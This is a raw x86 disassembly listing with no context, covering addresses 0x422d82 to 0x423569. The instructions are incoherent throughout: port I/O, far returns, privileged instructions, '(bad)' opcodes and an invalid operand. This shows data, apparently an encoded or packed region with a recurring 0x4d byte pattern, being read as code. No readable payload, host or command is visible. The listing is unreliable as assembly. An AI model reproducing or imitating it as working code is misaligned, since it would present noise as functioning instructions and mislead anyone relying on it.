  422d82:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422d88:	push   ecx
  422d89:	in     al,0xc6
  422d8b:	cmp    dh,al
  422d8d:	stc    
  422d8e:	in     eax,dx
  422d8f:	out    0x76,eax
  422d91:	out    dx,al
  422d92:	or     ebp,ebp
  422d94:	bound  ecx,QWORD PTR [ebp+0x77ed8d8d]
  422d9a:	jbe    0x422d28
  422d9c:	xor    al,0xf9
  422d9f:	in     eax,dx
  422da0:	retf   
  422da1:	out    dx,al
  422da2:	in     al,0xec
  422da4:	loop   0x422d92
  422da6:	lahf   
  422da7:	and    bh,0xfd
  422daa:	mov    dl,0xba
  422dac:	outs   dx,DWORD PTR ds:[esi]
  422dad:	inc    ebx
  422dae:	push   0x6d
  422db0:	loop   0x422e1f
  422db2:	test   eax,0xadc96601
  422db7:	in     al,dx
  422db8:	lea    ecx,[ebp+0x45866180]
  422dbe:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422dc4:	push   ecx
  422dc5:	in     al,0xc6
  422dc7:	push   eax
  422dc8:	lock xchg BYTE PTR [eax-0x10],dl
  422dcc:	sub    ebp,0xffffffcb
  422dcf:	out    dx,al
  422dd0:	in     al,0xd3
  422dd2:	add    BYTE PTR ds:0x3a83b7ed,0xb6
  422dd9:	mov    ch,ch
  422ddb:	lock or DWORD PTR [ecx+esi*4],0xffffffed
  422de0:	retf   
  422de1:	mov    eax,ds:0x225e1fd3
  422de6:	or     al,0x8d
  422de8:	lea    eax,[ebx-0x4e]
  422deb:	adc    BYTE PTR [ecx+0x72],0xb7
  422def:	sub    esp,0x77
  422df2:	xor    DWORD PTR [esi-0x288137c],0x50
  422df9:	ja     0x422daa
  422dfb:	les    eax,FWORD PTR [edi-0x13]
  422dfe:	mov    dh,ch
  422e00:	xchg   BYTE PTR [eax],bh
  422e02:	lea    ecx,[ebp-0x493b4973]
  422e08:	mov    bh,0x83
  422e0a:	pop    edi
  422e0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e0c:	test   ah,ah
  422e0e:	outs   dx,DWORD PTR ds:[esi]
  422e0f:	dec    ebp
  422e10:	ja     0x422d95
  422e12:	aas    
  422e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e14:	test   BYTE PTR [ecx+0x755e86d7],dh
  422e1a:	outs   dx,DWORD PTR ds:[esi]
  422e1b:	lea    ecx,[ebp+0x50fd77ec]
  422e21:	ja     0x422dd2
  422e23:	mov    dl,0xb7
  422e25:	sub    esi,0xffffffe2
  422e28:	out    dx,al
  422e29:	test   eax,0x807b4d43
  422e2e:	jl     0x422db0
  422e30:	(bad)  
  422e31:	scas   eax,DWORD PTR es:[edi]
  422e32:	xchg   al,ah
  422e34:	lea    ecx,[ebp-0x2ac5c173]
  422e3a:	in     al,dx
  422e3b:	xor    bh,ah
  422e3d:	xor    DWORD PTR [esi-0x78284e44],0xffffffc4
  422e44:	lea    ecx,[ebp+0x77]
  422e47:	add    DWORD PTR [eax-0x4d120610],0xc
  422e4e:	and    bh,0x8a
  422e51:	cmp    BYTE PTR [ebx+eax*2+0x77],0x35
  422e56:	pop    edi
  422e57:	ja     0x422ddc
  422e59:	fcmovnu st,st(2)
  422e5b:	or     BYTE PTR [ebx+0x43],0xd7
  422e5f:	add    DWORD PTR [eax-0xab9c269],0x63
  422e66:	test   ebx,edx
  422e68:	in     al,dx
  422e69:	jg     0x422e42
  422e6b:	dec    ebx
  422e6c:	push   eax
  422e6d:	out    0x8a,eax
  422e6f:	or     eax,esp
  422e71:	xor    ah,BYTE PTR [ebx-0x19]
  422e74:	cmp    eax,0xccaaea09
  422e79:	dec    ebp
  422e7a:	dec    ebp
  422e7b:	xchg   dl,dl
  422e7d:	lea    ecx,[ebp+0x16a438d]
  422e83:	lds    esi,FWORD PTR ds:0x2d978065
  422e89:	adc    bh,0x8b
  422e8c:	inc    ebx
  422e8d:	xlat   BYTE PTR ds:[ebx]
  422e8e:	sbb    eax,0x9780d450
  422e93:	inc    ebp
  422e94:	and    bh,0x8a
  422e97:	inc    ebx
  422e98:	out    0x35,eax
  422e9a:	push   eax
  422e9b:	(bad)  
  422e9c:	jo     0x422e41
  422e9e:	test   eax,0x8d25fbab
  422ea3:	test   eax,0x6d6a439d
  422ea8:	les    eax,FWORD PTR [edx-0x7272f95e]
  422eae:	lea    edi,[edx]
  422eb0:	in     al,0x3a
  422eb2:	je     0x422e66
  422eb4:	mov    ah,0xef
  422eb6:	cdq    
  422eb7:	adc    bh,0x8b
  422eba:	arpl   di,dx
  422ebc:	and    eax,0x7780f9d3
  422ec1:	test   BYTE PTR [edx+0x5046ef84],dh
  422ec7:	ja     0x422e4d
  422ec9:	push   eax
  422eca:	xlat   BYTE PTR ds:[ebx]
  422ecb:	mov    ebp,DWORD PTR [ecx+0x76f08074]
  422ed1:	or     eax,esp
  422ed3:	push   0xffffffb2
  422ed5:	mov    edx,0x8677ecee
  422eda:	in     al,dx
  422edb:	mov    dl,0xc4
  422edd:	outs   dx,DWORD PTR ds:[esi]
  422ede:	or     eax,esp
  422ee0:	push   0xffffffec
  422ee2:	ja     0x422f5a
  422ee4:	add    bh,0xfd
  422ee7:	add    ebp,eax
  422ee9:	ja     0x422e78
  422eeb:	inc    ebx
  422eec:	push   0x1
  422eee:	lds    esi,FWORD PTR [edi-0x73]
  422ef1:	mov    ds:0x8d8d8d06,al
  422ef6:	cmp    dl,bl
  422ef8:	and    eax,0x5d353180
  422efd:	mov    dl,0xb5
  422eff:	xor    eax,0x3163ef2d
  422f04:	xor    eax,0x8f26d3a5
  422f09:	push   cs
  422f0a:	dec    ebp
  422f0b:	jne    0x422f42
  422f0d:	pop    ebp
  422f0e:	mov    dl,0xb4
  422f10:	out    dx,eax
  422f11:	adc    BYTE PTR [ebp+0x11802d35],dl
  422f17:	or     DWORD PTR [edi+edx*4-0x73],ebx
  422f1b:	mov    dl,0xbe
  422f1d:	dec    DWORD PTR [ecx]
  422f1f:	and    bh,dh
  422f21:	pop    edi
  422f22:	xor    DWORD PTR ds:0x801bd32d,esi
  422f28:	mov    al,ds:0x8def8d60
  422f2d:	lea    eax,[ebx-0x2]
  422f30:	mov    dl,0xbe
  422f32:	das    
  422f33:	mov    ecx,0xec8df03a
  422f38:	push   0x1
  422f3a:	lds    esi,FWORD PTR ds:0x7b2746d
  422f40:	das    
  422f41:	aas    
  422f42:	xor    DWORD PTR ds:0xb9a0432d,esi
  422f48:	aas    
  422f49:	xchg   edi,eax
  422f4a:	(bad)  
  422f4b:	in     al,dx
  422f4c:	push   0xffffffed
  422f4e:	push   0x3a
  422f50:	add    ebp,eax
  422f52:	xor    eax,0x8099746d
  422f57:	sub    al,BYTE PTR [esi+0x4d4d069c]
  422f5d:	sbb    BYTE PTR [eax+eax*4+0x6ffc51],0x86
  422f65:	repnz push es
  422f67:	dec    ebp
  422f68:	dec    ebp
  422f69:	cdq    
  422f6a:	sub    BYTE PTR [edx],0xfc
  422f6d:	jns    0x422f9e
  422f6f:	stos   DWORD PTR es:[edi],eax
  422f70:	xchg   BYTE PTR [ebx-0x66b2b2fa],dh
  422f76:	cld    
  422f77:	jns    0x422fe8
  422f79:	mov    ds:0x4d063986,eax
  422f7e:	dec    ebp
  422f7f:	cld    
  422f80:	jns    0x422f8e
  422f82:	cdq    
  422f83:	cmp    BYTE PTR [esi-0x42],0xc4
  422f87:	test   DWORD PTR [ebp+0x4d],ecx
  422f8a:	xchg   edi,eax
  422f8b:	add    BYTE PTR [edi+0x3a4587a2],0x8d
  422f92:	lea    edi,[edi+esi*2-0x75]
  422f96:	mul    BYTE PTR [edi+ebp*2]
  422f99:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  422f9d:	cmc    
  422f9e:	and    al,0x6f
  422fa0:	cmp    BYTE PTR [eax+0x7750ef77],al
  422fa6:	out    dx,eax
  422fa7:	xor    BYTE PTR [edi-0x75],0x80
  422fab:	xchg   edi,eax
  422fac:	mov    edx,DWORD PTR [ebx+0xde29b99]
  422fb2:	lahf   
  422fb3:	push   ebx
  422fb4:	mov    dh,0xb2
  422fb6:	clc    
  422fb7:	sub    DWORD PTR [edx+eiz*1+0x24],esp
  422fbb:	outs   dx,DWORD PTR ds:[esi]
  422fbc:	cmp    BYTE PTR [ebx+0x74],dl
  422fbf:	mov    dl,0x86
  422fc1:	or     al,0xff
  422fc3:	sti    
  422fc4:	push   eax
  422fc5:	ja     0x42303d
  422fc7:	xor    BYTE PTR [edi-0x75],0x80
  422fcb:	xchg   edi,eax
  422fcc:	mov    edx,DWORD PTR [ebx+0x74]
  422fcf:	mov    dl,0x86
  422fd1:	or     al,0x53
  422fd3:	mov    dh,0xb2
  422fd5:	clc    
  422fd6:	sub    edi,edi
  422fd8:	sti    
  422fd9:	push   eax
  422fda:	ja     0x422f66
  422fdc:	xor    BYTE PTR [edi-0x75],0x80
  422fe0:	xchg   edi,eax
  422fe1:	mov    edx,DWORD PTR [ebx+0x74]
  422fe4:	mov    dl,0x86
  422fe6:	or     al,0x53
  422fe8:	mov    dh,0xb2
  422fea:	clc    
  422feb:	sub    edi,edi
  422fed:	sti    
  422fee:	push   eax
  422fef:	ja     0x423053
  422ff1:	xor    BYTE PTR [edi-0x75],0x80
  422ff5:	xchg   edi,eax
  422ff6:	mov    edx,DWORD PTR [ebx+0x74]
  422ff9:	mov    dl,0x86
  422ffb:	or     al,0x53
  422ffd:	mov    dh,0xb2
  422fff:	clc    
  423000:	sub    edi,edi
  423002:	sti    
  423003:	push   eax
  423004:	ja     0x422f8c
  423006:	jl     0x42307f
  423008:	mul    BYTE PTR cs:[esi+ebp*8]
  42300c:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  423010:	mul    BYTE PTR [ebx+0x777c386f]
  423016:	es cli 
  423018:	and    al,0x6f
  42301a:	cmp    dl,ah
  42301c:	cmp    eax,0x6277509d
  423021:	push   eax
  423022:	ja     0x423086
  423024:	loop   0x422fe3
  423026:	popf   
  423027:	push   eax
  423028:	ja     0x42308c
  42302a:	push   eax
  42302b:	ja     0x42308f
  42302d:	jl     0x4230a6
  42302f:	bound  ecx,QWORD PTR [edx]
  423031:	lea    ecx,[ebp+0x62777c8d]
  423037:	jns    0x422fc6
  423039:	lea    ecx,[ebp-0x7f748880]
  42303f:	xchg   edi,eax
  423040:	mov    edx,DWORD PTR [ebx+0x74]
  423043:	push   ebx
  423044:	mov    dh,0xb2
  423046:	xchg   BYTE PTR [edx+esi*4],cl
  423049:	clc    
  42304a:	sub    edi,edi
  42304c:	sti    
  42304d:	push   eax
  42304e:	ja     0x4230b2
  423050:	xor    BYTE PTR [edi-0x75],0x80
  423054:	xchg   edi,eax
  423055:	mov    edx,DWORD PTR [ebx+0x74]
  423058:	push   ebx
  423059:	mov    dh,0xb2
  42305b:	xchg   BYTE PTR [edx+esi*4],cl
  42305e:	clc    
  42305f:	sub    edi,edi
  423061:	sti    
  423062:	push   eax
  423063:	ja     0x4230c7
  423065:	jl     0x4230de
  423067:	jp     0x42300c
  423069:	or     al,0x8d
  42306b:	lea    edi,[edi+esi*2-0x7c]
  42306f:	pop    edi
  423070:	lea    ecx,[ebp-0x50888373]
  423076:	out    0x8d,eax
  423078:	lea    ecx,[ebp+0xdc86801]
  42307e:	dec    ebp
  42307f:	dec    ebp
  423080:	add    DWORD PTR [eax+0x7a],ebx
  423083:	or     eax,0xfe864d4d
  423088:	or     eax,0xf04d4d4d
  42308d:	scas   eax,DWORD PTR es:[edi]
  42308e:	xlat   BYTE PTR ds:[ebx]
  42308f:	pop    es
  423090:	dec    ebp
  423091:	lock test bh,dl
  423094:	add    al,0x4d
  423096:	lock jp 0x423070
  423099:	jb     0x423117
  42309b:	ja     0x423021
  42309d:	mov    eax,ds:0x808d8d6d
  4230a2:	ja     0x42302f
  4230a4:	xor    al,0x8b
  4230a7:	push   ebx
  4230a8:	je     0x42305c
  4230aa:	xchg   BYTE PTR [edx+eiz*8],cl
  4230ad:	or     eax,0xb25153a9
  4230b2:	mov    edx,0x50b2ff29
  4230b7:	ja     0x423123
  4230b9:	xor    BYTE PTR [edi-0x75],0x80
  4230bd:	lock mov ebp,ebp
  4230c0:	mov    bh,0xc8
  4230c2:	lea    edx,[ebx+0x74]
  4230c5:	mov    dl,0x86
  4230c7:	or     al,0x53
  4230c9:	push   ecx
  4230ca:	mov    dl,0xba
  4230cc:	sub    edi,edi
  4230ce:	mov    dl,0x50
  4230d0:	ja     0x42314c
  4230d2:	mov    ch,0x4a
  4230d4:	sbb    eax,0x508d8d8d
  4230d9:	ja     0x4230a3
  4230db:	sub    BYTE PTR [ebp-0x7f],0x50
  4230df:	ja     0x423068
  4230e1:	sub    BYTE PTR [ebp+0x21],0x50
  4230e5:	ja     0x423119
  4230e7:	xor    BYTE PTR [edi-0x11],0x1
  4230eb:	lock enter 0x1050,0x62
  4230f0:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  4230f6:	add    eax,esi
  4230f8:	xchg   DWORD PTR [eax+0x10],edx
  4230fb:	push   esi
  4230fc:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  423102:	dec    ebp
  423103:	xlat   BYTE PTR ds:[ebx]
  423104:	out    dx,eax
  423105:	add    eax,esi
  423107:	xor    dl,BYTE PTR [eax+0x10]
  42310a:	pop    esi
  42310b:	cmp    cl,BYTE PTR [ebp+0x3fba868d]
  423111:	lea    ecx,[ebp-0x7f740f80]
  423117:	xchg   edi,eax
  423118:	mov    edx,DWORD PTR [ebx+0x11]
  42311b:	push   ebx
  42311c:	jle    0x4230d0
  42311e:	mov    esi,0x29f8b20c
  423123:	(bad)  
  423124:	(bad)  
  423125:	arpl   bp,di
  423127:	or     DWORD PTR [edi],ecx
  423129:	(bad)  
  42312a:	in     al,dx
  42312b:	lea    ecx,[ebp-0x7f108880]
  423131:	int    0x36
  423133:	cmp    cl,BYTE PTR [ebp-0x7f107f73]
  423139:	ja     0x42312a
  42313b:	or     ch,0x36
  42313e:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  423144:	xchg   edx,eax
  423145:	gs xor al,0xef
  423149:	adc    BYTE PTR [eax+0x32],0x3a
  42314d:	lea    ecx,[ebp+0x4d151801]
  423153:	dec    ebp
  423154:	dec    ebp
  423155:	stos   BYTE PTR es:[edi],al
  423156:	adc    BYTE PTR [edi+0x26d180ef],0x3a
  42315d:	lea    ecx,[ebp+0x5aec9080]
  423163:	adc    BYTE PTR [ebp-0x111d7273],cl
  423169:	dec    ebp
  42316a:	bound  eax,QWORD PTR [ecx-0x73]
  42316d:	lea    ecx,[ebp+0x25964daa]
  423173:	push   ebx
  423174:	push   0x7c
  423176:	dec    edi
  423177:	push   ebp
  423178:	dec    ebp
  423179:	dec    ebp
  42317a:	dec    ebp
  42317b:	outs   dx,BYTE PTR ds:[esi]
  42317c:	mov    ds:0x4f7c0a43,eax
  423181:	pop    ebp
  423182:	dec    ebp
  423183:	dec    ebp
  423184:	dec    ebp
  423185:	jg     0x423135
  423187:	push   ebp
  423188:	fwait
  423189:	jl     0x4231da
  42318b:	gs dec ebp
  42318d:	dec    ebp
  42318e:	dec    ebp
  42318f:	stos   DWORD PTR es:[edi],eax
  423190:	lock scas al,BYTE PTR es:[edi]
  423192:	aas    
  423193:	cld    
  423194:	dec    edi
  423195:	ins    DWORD PTR es:[edi],dx
  423196:	dec    ebp
  423197:	dec    ebp
  423198:	dec    ebp
  423199:	xchg   BYTE PTR [ecx],al
  42319b:	push   0x4d4d4d92
  4231a0:	inc    esp
  4231a1:	mov    ecx,0x6a53f544
  4231a6:	jl     0x4231f7
  4231a8:	sub    eax,0x6e4d4d4d
  4231ad:	mov    ds:0x4f7c0a43,eax
  4231b2:	xor    eax,0x7f4d4d4d
  4231b7:	scas   al,BYTE PTR es:[edi]
  4231b8:	push   ebp
  4231b9:	fwait
  4231ba:	jl     0x42320b
  4231bc:	cmp    eax,0xab4d4d4d
  4231c1:	lock scas al,BYTE PTR es:[edi]
  4231c3:	imul   edi,esp,0x4f
  4231c6:	inc    ebp
  4231c7:	dec    ebp
  4231c8:	dec    ebp
  4231c9:	dec    ebp
  4231ca:	xchg   BYTE PTR [ecx],al
  4231cc:	push   0x4d4d4d47
  4231d1:	inc    esp
  4231d2:	mov    ecx,0x7780f544
  4231d7:	out    dx,eax
  4231d8:	or     ch,0x32
  4231db:	cmp    cl,BYTE PTR [ebp-0x10187f73]
  4231e1:	in     eax,dx
  4231e2:	push   0x71
  4231e4:	push   eax
  4231e5:	ja     0x42321d
  4231e7:	xor    BYTE PTR [edi-0x11],0x80
  4231eb:	int    0xfd
  4231ed:	cmp    cl,BYTE PTR [ebp-0x32888373]
  4231f3:	xchg   ebp,eax
  4231f4:	mov    ds:0x777caea5,eax
  4231f9:	lldt   WORD PTR [edi+0x7cb9969d]
  423200:	ja     0x423212
  423202:	aas    
  423203:	xchg   BYTE PTR [edi+ecx*2-0x3b],bh
  423207:	dec    ebp
  423208:	dec    ebp
  423209:	dec    ebp
  42320a:	outs   dx,BYTE PTR ds:[esi]
  42320b:	mov    ds:0x4f7c0a43,eax
  423210:	push   edx
  423211:	dec    ebp
  423212:	dec    ebp
  423213:	dec    ebp
  423214:	jg     0x4231c4
  423216:	aas    
  423217:	xchg   ebp,eax
  423218:	jl     0x423269
  42321a:	aad    0x4d
  42321c:	dec    ebp
  42321d:	dec    ebp
  42321e:	popf   
  42321f:	or     bh,BYTE PTR [edi+0x59]
  423222:	jl     0x423273
  423224:	fisttp QWORD PTR [ebp+0x4d]
  423227:	dec    ebp
  423228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423229:	xchg   edi,eax
  42322a:	lock scas al,BYTE PTR es:[edi]
  42322c:	jl     0x42327d
  42322e:	in     eax,0x4d
  423230:	dec    ebp
  423231:	dec    ebp
  423232:	xchg   esi,eax
  423233:	add    BYTE PTR [edi],bh
  423235:	xchg   BYTE PTR [edi+ecx*2-0x63],bh
  423239:	dec    ebp
  42323a:	dec    ebp
  42323b:	dec    ebp
  42323c:	outs   dx,BYTE PTR ds:[esi]
  42323d:	mov    ds:0x4f7c0a43,eax
  423242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423243:	dec    ebp
  423244:	dec    ebp
  423245:	dec    ebp
  423246:	jg     0x4231f6
  423248:	aas    
  423249:	xchg   ebp,eax
  42324a:	jl     0x42329b
  42324c:	lods   eax,DWORD PTR ds:[esi]
  42324d:	dec    ebp
  42324e:	dec    ebp
  42324f:	dec    ebp
  423250:	popf   
  423251:	or     bh,BYTE PTR [edi+0x59]
  423254:	jl     0x4232a5
  423256:	mov    ch,0x4d
  423258:	dec    ebp
  423259:	dec    ebp
  42325a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42325b:	xchg   edi,eax
  42325c:	lock scas al,BYTE PTR es:[edi]
  42325e:	jl     0x4232af
  423260:	mov    ebp,0x964d4d4d
  423265:	add    BYTE PTR [ebx-0x7a],ch
  423268:	xchg   BYTE PTR [edx+0x3d],ah
  42326b:	lea    ecx,[ebp+0x3677800a]
  423271:	dec    ebp
  423272:	jno    0x4231f4
  423274:	ja     0x423201
  423276:	xor    al,0x8b
  423279:	push   ebx
  42327a:	je     0x4232cf
  42327c:	push   ecx
  42327d:	mov    dl,0xba
  42327f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423285:	xor    al,0x84
  423288:	arpl   WORD PTR [edx+0x3aca0f09],si
  42328e:	lea    ecx,[ebp-0x7f068880]
  423294:	lock stc 
  423296:	push   ebx
  423297:	je     0x4232ec
  423299:	push   ecx
  42329a:	mov    dl,0xba
  42329c:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4232a2:	xor    al,0x84
  4232a5:	inc    ebx
  4232a6:	std    
  4232a7:	xor    BYTE PTR [edi+0x6a],0x63
  4232ab:	mov    dl,0x9
  4232ad:	into   
  4232ae:	xchg   esp,eax
  4232af:	cmp    cl,BYTE PTR [ebp+0x3e777c8d]
  4232b5:	lea    ecx,[ebp+0x77808d8d]
  4232bb:	out    dx,eax
  4232bc:	and    BYTE PTR [edx+0x32],0x3a
  4232c0:	lea    ecx,[ebp-0x7f101880]
  4232c6:	ja     0x4232b7
  4232c8:	or     ch,0x76
  4232cb:	cmp    cl,BYTE PTR [ebp+0x3dda868d]
  4232d1:	lea    ecx,[ebp+0x71994d0a]
  4232d7:	xor    al,0xef
  4232da:	adc    BYTE PTR [eax+0x46],0x3a
  4232de:	lea    ecx,[ebp+0x77803a50]
  4232e4:	out    dx,eax
  4232e5:	sbb    BYTE PTR [esi+0x32],0x3a
  4232e9:	lea    ecx,[ebp+0x53efd780]
  4232ef:	push   0x1
  4232f1:	sbb    BYTE PTR [ebp-0x79b2b2b3],bl
  4232f7:	fwait
  4232f8:	cmp    eax,0x800a8d8d
  4232fd:	ja     0x4232ee
  4232ff:	or     ch,0x46
  423302:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  423308:	fwait
  423309:	out    dx,eax
  42330a:	push   eax
  42330b:	ja     0x423323
  42330d:	xor    BYTE PTR [edi-0x11],0x80
  423311:	pop    esi
  423312:	xor    bh,BYTE PTR [edx]
  423314:	lea    ecx,[ebp+0x53efd780]
  42331a:	push   0x1
  42331c:	sbb    ch,al
  42331e:	dec    ebp
  42331f:	dec    ebp
  423320:	dec    ebp
  423321:	xchg   BYTE PTR [ebp+0x3d],al
  423324:	lea    ecx,[ebp-0x10887ff6]
  42332a:	or     ch,0x46
  42332d:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  423333:	fwait
  423334:	out    dx,eax
  423335:	xor    BYTE PTR [edi-0x11],0x80
  423339:	pop    esi
  42333a:	xor    bh,BYTE PTR [edx]
  42333c:	lea    ecx,[ebp+0x53efd780]
  423342:	push   0x1
  423344:	sbb    BYTE PTR [ebp+0x4d],dl
  423347:	dec    ebp
  423348:	dec    ebp
  423349:	xchg   dh,ch
  42334b:	cmp    eax,0x800a8d8d
  423350:	ja     0x423341
  423352:	or     ch,0x46
  423355:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  42335b:	fwait
  42335c:	out    dx,eax
  42335d:	in     eax,dx
  42335e:	mov    bh,0x5e
  423360:	lea    edx,[eax+0x77]
  423363:	xor    BYTE PTR ss:[edi+0x5e],0xe2
  423368:	pop    ds
  423369:	push   ebx
  42336a:	jb     0x42330b
  42336c:	dec    ebx
  42336d:	add    eax,0x992fbcd
  423372:	loopne 0x42336f
  423374:	or     cl,BYTE PTR [ebp-0x69]
  423377:	ss dec edi
  423379:	push   0xffffffd7
  42337b:	arpl   WORD PTR [eax-0x7b12a189],ax
  423381:	mov    ebp,gs
  423383:	push   0x6e
  423385:	or     cl,BYTE PTR [ebp-0x69]
  423388:	push   ss
  423389:	dec    edi
  42338a:	push   0xffffffd5
  42338c:	rol    BYTE PTR [eax+0x5e80ef77],cl
  423392:	xor    bh,BYTE PTR [edx]
  423394:	lea    ecx,[ebp+0x53efd780]
  42339a:	push   0x1
  42339c:	xchg   edi,eax
  42339d:	int    0x86
  42339f:	and    bh,BYTE PTR [ebx]
  4233a1:	lea    ecx,[ebp-0x10887ff6]
  4233a7:	or     ch,0x3e
  4233aa:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4233b0:	fwait
  4233b1:	out    dx,eax
  4233b2:	push   eax
  4233b3:	ja     0x423364
  4233b5:	(bad)  
  4233b6:	out    dx,al
  4233b7:	in     eax,dx
  4233b8:	mov    bh,0xaf
  4233ba:	lea    ecx,[ebp+0x77]
  4233bd:	pop    esi
  4233be:	in     eax,dx
  4233bf:	out    0x5e,eax
  4233c1:	sub    eax,0x77802ee4
  4233c6:	stc    
  4233c7:	xor    al,0xf9
  4233ca:	adc    bh,0xef
  4233cd:	loop   0x4233dc
  4233cf:	stos   DWORD PTR es:[edi],eax
  4233d0:	push   ebx
  4233d1:	je     0x423426
  4233d3:	sub    dh,BYTE PTR [edx-0x454df37a]
  4233d9:	sub    edi,edi
  4233db:	mov    dl,0x1
  4233dd:	sbb    al,cl
  4233df:	or     eax,0xc3864d4d
  4233e4:	cmp    ecx,DWORD PTR [ebp+0x77800a8d]
  4233ea:	mov    eax,DWORD PTR [eax-0x287f7410]
  4233f0:	out    dx,eax
  4233f1:	push   ebx
  4233f2:	je     0x423447
  4233f4:	sub    dh,BYTE PTR [edx-0x454df37a]
  4233fa:	sub    edi,edi
  4233fc:	mov    dl,0x1
  4233fe:	sbb    BYTE PTR [edx+0xd],bh
  423401:	dec    ebp
  423402:	dec    ebp
  423403:	xchg   dl,bl
  423405:	cmp    ecx,DWORD PTR [ebp-0x68b2f573]
  42340b:	scas   eax,DWORD PTR es:[edi]
  42340c:	xor    al,0x8b
  42340f:	adc    BYTE PTR [edi+0x5311538b],0x9c
  423416:	mov    dl,0xbe
  423418:	or     al,0xb2
  42341a:	clc    
  42341b:	sub    edi,edi
  42341d:	(bad)  
  42341e:	arpl   bp,di
  423420:	xlat   BYTE PTR ds:[ebx]
  423421:	mov    WORD PTR [edi+esi*2+0x3e],?
  423425:	cmp    cl,BYTE PTR [ebp+0x77808d8d]
  42342b:	stc    
  42342c:	xor    al,0xf9
  42342f:	push   ebx
  423430:	je     0x4233e4
  423432:	xchg   BYTE PTR [ebx+edx*2],cl
  423435:	sub    dh,BYTE PTR [edx-0x4d00d646]
  42343b:	in     al,dx
  42343c:	ja     0x4234a8
  42343e:	push   eax
  42343f:	ja     0x4234ab
  423441:	xor    BYTE PTR [edi+0x3e],0x4f
  423445:	push   0xffffffd5
  423447:	sbb    eax,0x80f97780
  42344c:	lock stc 
  42344e:	push   ebx
  42344f:	je     0x4234a4
  423451:	sub    dh,BYTE PTR [edx-0x454df37a]
  423457:	sub    edi,edi
  423459:	mov    dl,0xec
  42345b:	ja     0x4234d7
  42345d:	push   eax
  42345e:	ja     0x4234da
  423460:	xor    BYTE PTR [edi-0x7],0x80
  423464:	lock stc 
  423466:	push   ebx
  423467:	je     0x4234bc
  423469:	sub    dh,BYTE PTR [edx-0x794dd646]
  42346f:	or     al,0xff
  423471:	mov    dl,0x80
  423473:	lock test BYTE PTR [ebx-0x3],al
  423477:	xor    BYTE PTR [edi+0x6a],0x63
  42347b:	mov    dl,0x9
  42347d:	dec    esp
  42347e:	or     DWORD PTR ds:0xde24d4d,0x7a7780a9
  423488:	xor    al,0x6a
  42348b:	arpl   bp,di
  42348d:	xlat   BYTE PTR ds:[ebx]
  42348e:	push   cs
  42348f:	dec    ebp
  423490:	xlat   BYTE PTR ds:[ebx]
  423491:	out    dx,eax
  423492:	add    DWORD PTR [edi-0x76],esi
  423495:	or     al,BYTE PTR [esi-0x7272809a]
  42349b:	push   eax
  42349c:	ja     0x423514
  42349e:	les    ebx,FWORD PTR [ebx]
  4234a0:	xor    BYTE PTR [edi+0x76],0x80
  4234a4:	lock stc 
  4234a6:	adc    BYTE PTR [edi+0x531153f9],0x7e
  4234ad:	mov    dl,0xbe
  4234af:	or     al,0xb2
  4234b1:	clc    
  4234b2:	sub    edi,edi
  4234b4:	(bad)  
  4234b5:	outs   dx,BYTE PTR ds:[esi]
  4234b6:	out    dx,eax
  4234b7:	xor    BYTE PTR [edi-0x75],0x80
  4234bb:	lock mov edx,DWORD PTR [ebx+0x74]
  4234bf:	push   ebx
  4234c0:	push   ecx
  4234c1:	mov    dl,0xba
  4234c3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4234c9:	xor    al,0x76
  4234cc:	arpl   WORD PTR [edx-0x33f0f7],si
  4234d2:	lea    ecx,[ebp-0x7f748880]
  4234d8:	lock mov edx,DWORD PTR [ebx+0x74]
  4234dc:	push   ebx
  4234dd:	push   ecx
  4234de:	mov    dl,0xba
  4234e0:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4234e6:	xor    al,0x8a
  4234e9:	arpl   WORD PTR [edx-0x7bf0f7],si
  4234ef:	lea    ecx,[ebp-0x7f748880]
  4234f5:	lock mov edx,DWORD PTR [ebx+0x74]
  4234f9:	push   ebx
  4234fa:	push   ecx
  4234fb:	mov    dl,0x86
  4234fd:	or     al,0xb2
  4234ff:	mov    edx,0xc4b2ff29
  423504:	adc    eax,0x80f9f080
  423509:	xchg   edi,eax
  42350a:	stc    
  42350b:	push   ebx
  42350c:	adc    DWORD PTR [ebx+0x7e],edx
  42350f:	mov    dl,0xbe
  423511:	or     al,0xb2
  423513:	clc    
  423514:	sub    edi,edi
  423516:	(bad)  
  423517:	in     al,dx
  423518:	mov    dl,0x80
  42351a:	lock mov ah,BYTE PTR [ebx-0x4e]
  42351e:	in     al,0xb8
  423520:	xor    BYTE PTR [edi-0x76],0x50
  423524:	ja     0x4234aa
  423526:	xor    BYTE PTR [edi+0x76],0x50
  42352a:	ja     0x42358e
  42352c:	ins    BYTE PTR es:[edi],dx
  42352d:	mul    BYTE PTR [edi+ebp*2]
  423530:	cmp    BYTE PTR [eax-0x19],dl
  423533:	inc    esi
  423534:	jl     0x4235ad
  423536:	xor    ch,0x24
  423539:	outs   dx,DWORD PTR ds:[esi]
  42353a:	cmp    BYTE PTR [eax-0xf7fb989],al
  423540:	inc    esi
  423541:	push   ebx
  423542:	je     0x423597
  423544:	push   ecx
  423545:	mov    dl,0x86
  423547:	or     al,0xb2
  423549:	mov    edx,0x50b2ff29
  42354e:	ja     0x4235a6
  423550:	xor    BYTE PTR [edi+0x46],0x80
  423554:	lock inc esi
  423556:	push   ebx
  423557:	je     0x4235ac
  423559:	push   ecx
  42355a:	mov    dl,0x86
  42355c:	or     al,0xb2
  42355e:	mov    edx,0x50b2ff29
  423563:	ja     0x4235df
  423565:	jl     0x4235de
  423567:	ds dec ecx
  423569:	and    al,0x6f
